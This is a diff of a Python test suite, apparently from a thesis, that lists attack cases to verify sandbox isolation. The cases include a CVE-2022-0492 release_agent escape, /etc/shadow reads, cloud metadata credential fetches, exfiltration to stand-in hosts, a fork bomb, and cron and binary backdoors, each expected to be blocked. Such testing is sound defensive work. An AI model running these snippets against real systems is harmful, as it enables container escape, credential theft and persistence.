@@ -8,15 +8,22 @@ Scenariji su izvedeni iz vektora napada opisanih u potpoglavlju 2.2.2 rada:
   S4 - iscrpljivanje resursa (memorija, procesi, procesorsko vrijeme)
   S5 - perzistencija i lateralno kretanje
 
-Za svaki slucaj biljezi se ocekivani ishod. "expect_blocked=True" znaci da
-ocvrsnuto okruzenje napad mora zaustaviti; ako se izvrsi do kraja, izolacija je
-probijena. Polje "expected_mechanism" navodi mehanizam za koji se ocekuje da ce
-napad zaustaviti i usporeduje se sa stvarno zabiljezenim (odgovor na IP2).
+Bodovanje se temelji na sentinelu: svaka skripta ispisuje niz "__ATTACK_OK__"
+na standardni izlaz iskljucivo ako napad STVARNO postigne svoj cilj (npr. procita
+tudju datoteku, poveze se van, ucita modul jezgre). Ako mehanizam izolacije
+sprijeci napad, skripta do tog ispisa ne dode - bilo zato sto poziv vrati gresku,
+bilo zato sto podigne iznimku. Time se izbjegava pogresno biljezenje blokiranog
+napada kao uspjesnog: napad se smatra sprijecenim ako sentinel izostane.
+
+Polje "expected_mechanism" navodi mehanizam za koji se ocekuje da ce napad
+zaustaviti; sluzi za odgovor na IP2 i usporeduje se sa stvarno zabiljezenim.
 """
 from __future__ import annotations
 
 from dataclasses import dataclass
 from typing import List, Optional
+
+SENTINEL = "__ATTACK_OK__"
 
 
 @dataclass(frozen=True)
@@ -37,55 +44,58 @@ CASES: List[AttackCase] = [
         code=(
             "import ctypes, os\n"
             "libc = ctypes.CDLL(None, use_errno=True)\n"
-            "# init_module nije u seccomp allowlisti -> EPERM\n"
-            "res = libc.syscall(175, 0, 0, 0)\n"
-            "print('syscall vratio', res, 'errno', ctypes.get_errno())\n"
-            "raise SystemExit(0 if res == 0 else 1)\n"
+            "res = libc.syscall(175, 0, 0, 0)   # init_module\n"
+            "if res != 0:\n"
+            "    e = ctypes.get_errno()\n"
+            "    raise OSError(e, os.strerror(e))\n"
+            "print('__ATTACK_OK__ modul ucitan')\n"
         ),
         expect_blocked=True, expected_mechanism="seccomp",
-        note="init_module blokira seccomp jos prije nego dosegne jezgru",
     ),
     AttackCase(
         id="S1-02", scenario="S1", title="unshare novog imenskog prostora",
         code=(
-            "import ctypes\n"
+            "import ctypes, os\n"
             "libc = ctypes.CDLL(None, use_errno=True)\n"
-            "CLONE_NEWUSER = 0x10000000\n"
-            "res = libc.unshare(CLONE_NEWUSER)\n"
-            "print('unshare', res, ctypes.get_errno())\n"
-            "raise SystemExit(0 if res == 0 else 1)\n"
+            "res = libc.unshare(0x10000000)   # CLONE_NEWUSER\n"
+            "if res != 0:\n"
+            "    e = ctypes.get_errno()\n"
+            "    raise OSError(e, os.strerror(e))\n"
+            "print('__ATTACK_OK__ novi user namespace')\n"
         ),
         expect_blocked=True, expected_mechanism="seccomp",
     ),
     AttackCase(
         id="S1-03", scenario="S1", title="montiranje datotecnog sustava",
         code=(
-            "import ctypes\n"
+            "import ctypes, os\n"
             "libc = ctypes.CDLL(None, use_errno=True)\n"
             "res = libc.mount(b'proc', b'/mnt', b'proc', 0, 0)\n"
-            "print('mount', res, ctypes.get_errno())\n"
-            "raise SystemExit(0 if res == 0 else 1)\n"
+            "if res != 0:\n"
+            "    e = ctypes.get_errno()\n"
+            "    raise OSError(e, os.strerror(e))\n"
+            "print('__ATTACK_OK__ montirano')\n"
         ),
         expect_blocked=True, expected_mechanism="seccomp",
     ),
     AttackCase(
         id="S1-04", scenario="S1", title="ptrace nad drugim procesom",
         code=(
-            "import ctypes\n"
+            "import ctypes, os\n"
             "libc = ctypes.CDLL(None, use_errno=True)\n"
-            "res = libc.ptrace(0, 1, 0, 0)  # PTRACE_TRACEME/ATTACH varijanta\n"
-            "print('ptrace', res, ctypes.get_errno())\n"
-            "raise SystemExit(0 if res == 0 else 1)\n"
+            "res = libc.ptrace(16, 1, 0, 0)   # PTRACE_ATTACH na PID 1\n"
+            "if res != 0:\n"
+            "    e = ctypes.get_errno()\n"
+            "    raise OSError(e, os.strerror(e))\n"
+            "print('__ATTACK_OK__ ptrace uspio')\n"
         ),
         expect_blocked=True, expected_mechanism="seccomp",
     ),
     AttackCase(
         id="S1-05", scenario="S1", title="upis u release_agent (CVE-2022-0492)",
         code=(
-            "# Pokusaj klasicnog bijega preko cgroups v1 release_agent.\n"
-            "# Zahtijeva CAP_SYS_ADMIN i mogucnost montiranja; oboje je uklonjeno.\n"
             "open('/sys/fs/cgroup/x/release_agent','w').write('/tmp/x')\n"
-            "print('upis uspio - izolacija probijena')\n"
+            "print('__ATTACK_OK__ release_agent zapisan')\n"
         ),
         expect_blocked=True, expected_mechanism="capabilities",
     ),
@@ -94,24 +104,23 @@ CASES: List[AttackCase] = [
         id="S2-01", scenario="S2", title="citanje /etc/shadow domacina",
         code=(
             "data = open('/etc/shadow').read()\n"
-            "print('procitano', len(data), 'bajtova')\n"
+            "print('__ATTACK_OK__ procitano', len(data), 'bajtova')\n"
         ),
         expect_blocked=True, expected_mechanism="capabilities",
-        note="unutar sandboxa /etc/shadow ne postoji ili je necitljiv za nobody",
     ),
     AttackCase(
         id="S2-02", scenario="S2", title="pisanje u /usr/bin (rootfs)",
         code=(
             "open('/usr/bin/evil','w').write('#!/bin/sh\\n')\n"
-            "print('zapisano na rootfs')\n"
+            "print('__ATTACK_OK__ zapisano na rootfs')\n"
         ),
         expect_blocked=True, expected_mechanism="read_only_fs",
     ),
     AttackCase(
-        id="S2-03", scenario="S2", title="izlazak iz /sandbox putanjom",
+        id="S2-03", scenario="S2", title="izlazak iz /tmp putanjom u /etc",
         code=(
-            "open('/sandbox/../etc/passwd','a').write('x')\n"
-            "print('izmijenjen /etc/passwd')\n"
+            "open('/tmp/../etc/passwd','a').write('x')\n"
+            "print('__ATTACK_OK__ izmijenjen /etc/passwd')\n"
         ),
         expect_blocked=True, expected_mechanism="read_only_fs",
     ),
@@ -121,9 +130,9 @@ CASES: List[AttackCase] = [
             "import socket\n"
             "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
             "s.connect('/var/run/docker.sock')\n"
-            "print('spojen na docker.sock - potpuni nadzor domacina')\n"
+            "print('__ATTACK_OK__ spojen na docker.sock')\n"
         ),
-        expect_blocked=True, expected_mechanism="read_only_fs",
+        expect_blocked=True, expected_mechanism="namespace",
         note="socket ne smije biti montiran u okruzenje; ocekuje se FileNotFound",
     ),
     # ---------------------------------------------------------------- S3
@@ -132,7 +141,8 @@ CASES: List[AttackCase] = [
         code=(
             "import urllib.request\n"
             "url='http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
-            "print(urllib.request.urlopen(url, timeout=3).read().decode())\n"
+            "d=urllib.request.urlopen(url, timeout=3).read()\n"
+            "print('__ATTACK_OK__ vjerodajnice', len(d))\n"
         ),
         expect_blocked=True, expected_mechanism="network_policy",
         note="najvazniji test: uspjeh znaci krada vjerodajnica racuna u oblaku",
@@ -142,7 +152,7 @@ CASES: List[AttackCase] = [
         code=(
             "import urllib.request\n"
             "urllib.request.urlopen('http://example.com/?d=tajna', timeout=3)\n"
-            "print('podaci poslani van')\n"
+            "print('__ATTACK_OK__ podaci poslani')\n"
         ),
         expect_blocked=True, expected_mechanism="network_policy",
     ),
@@ -151,7 +161,7 @@ CASES: List[AttackCase] = [
         code=(
             "import socket\n"
             "socket.gethostbyname('tajna.napadac.example')\n"
-            "print('DNS upit rijesen')\n"
+            "print('__ATTACK_OK__ DNS rijesen')\n"
         ),
         expect_blocked=True, expected_mechanism="network_policy",
     ),
@@ -161,7 +171,7 @@ CASES: List[AttackCase] = [
             "import socket\n"
             "s=socket.socket(); s.settimeout(2)\n"
             "s.connect(('10.0.0.1', 22))\n"
-            "print('otvoren unutarnji port - lateralno kretanje moguce')\n"
+            "print('__ATTACK_OK__ otvoren unutarnji port')\n"
         ),
         expect_blocked=True, expected_mechanism="network_policy",
     ),
@@ -170,8 +180,9 @@ CASES: List[AttackCase] = [
         id="S4-01", scenario="S4", title="iscrpljivanje memorije",
         code=(
             "blob = bytearray()\n"
-            "while True:\n"
+            "while len(blob) < 2_000_000_000:\n"
             "    blob.extend(b'x' * (10 * 1024 * 1024))\n"
+            "print('__ATTACK_OK__ zauzeto 2 GB')\n"
         ),
         expect_blocked=True, expected_mechanism="cgroups_memory",
     ),
@@ -179,11 +190,15 @@ CASES: List[AttackCase] = [
         id="S4-02", scenario="S4", title="fork bomba",
         code=(
             "import os\n"
-            "while True:\n"
+            "n = 0\n"
+            "for _ in range(10000):\n"
             "    try:\n"
-            "        os.fork()\n"
+            "        if os.fork() == 0:\n"
+            "            os._exit(0)\n"
+            "        n += 1\n"
             "    except OSError:\n"
-            "        pass\n"
+            "        raise SystemExit('fork ogranicen')\n"
+            "print('__ATTACK_OK__ forkano', n)\n"
         ),
         expect_blocked=True, expected_mechanism="cgroups_pids",
     ),
@@ -193,53 +208,58 @@ CASES: List[AttackCase] = [
             "x = 0\n"
             "while True:\n"
             "    x += 1\n"
+            "print('__ATTACK_OK__')\n"  # nedostizno: prekida ga timeout
         ),
         expect_blocked=True, expected_mechanism="timeout",
-        note="cgroups ogranicava udio CPU-a, a vremensko ogranicenje prekida izvrsavanje",
     ),
     AttackCase(
-        id="S4-04", scenario="S4", title="popunjavanje diska u /tmp",
+        id="S4-04", scenario="S4", title="popunjavanje diska domacina preko /tmp",
         code=(
+            "import shutil\n"
+            "before = shutil.disk_usage('/tmp').free\n"
+            "buf = b'x' * (10*1024*1024)\n"
             "with open('/tmp/fill','wb') as f:\n"
-            "    while True:\n"
-            "        f.write(b'x' * (10*1024*1024))\n"
+            "    for _ in range(100000):\n"
+            "        f.write(buf)\n"
+            "print('__ATTACK_OK__ zapisano', before)\n"
         ),
         expect_blocked=True, expected_mechanism="cgroups_memory",
-        note="/tmp je tmpfs ogranicene velicine; punjenje pogada tmpfs, ne domacina",
+        note="/tmp je tmpfs ogranicene velicine; punjenje ne pogada disk domacina",
     ),
     # ---------------------------------------------------------------- S5
     AttackCase(
         id="S5-01", scenario="S5", title="perzistencija preko cron zapisa",
         code=(
             "open('/etc/cron.d/backdoor','w').write('* * * * * root sh -c :\\n')\n"
-            "print('cron zadatak postavljen')\n"
+            "print('__ATTACK_OK__ cron postavljen')\n"
         ),
         expect_blocked=True, expected_mechanism="read_only_fs",
     ),
     AttackCase(
-        id="S5-02", scenario="S5", title="podizanje ovlasti preko setuid",
+        id="S5-02", scenario="S5", title="podizanje ovlasti preko setuid(0)",
         code=(
             "import os\n"
             "os.setuid(0)\n"
-            "print('postao root, uid =', os.getuid())\n"
+            "if os.getuid() == 0:\n"
+            "    print('__ATTACK_OK__ postao root')\n"
         ),
         expect_blocked=True, expected_mechanism="capabilities",
     ),
     AttackCase(
-        id="S5-03", scenario="S5", title="pokretanje vanjskog procesa (ljuska)",
+        id="S5-03", scenario="S5", title="upis izvrsne datoteke za perzistenciju",
         code=(
-            "import subprocess\n"
-            "print(subprocess.check_output(['/bin/sh','-c','id']).decode())\n"
+            "import os\n"
+            "p='/usr/local/bin/backdoor'\n"
+            "open(p,'w').write('#!/bin/sh\\necho pwned\\n')\n"
+            "os.chmod(p, 0o755)\n"
+            "print('__ATTACK_OK__ backdoor upisan i izvrsan')\n"
         ),
-        expect_blocked=True, expected_mechanism="none",
-        note="ljuska mozda ne postoji u minimalnoj slici; biljezi se stvarni ishod",
+        expect_blocked=True, expected_mechanism="read_only_fs",
     ),
     # ---------------------------------------------------------- kontrola
     AttackCase(
         id="C-01", scenario="C", title="dobrocudan racunski zadatak",
-        code=(
-            "print(sum(i*i for i in range(1000)))\n"
-        ),
+        code=("print(sum(i*i for i in range(1000)))\n"),
         expect_blocked=False, expected_mechanism="none",
         note="kontrolni slucaj: mora se izvrsiti do kraja u svakoj konfiguraciji",
     ),
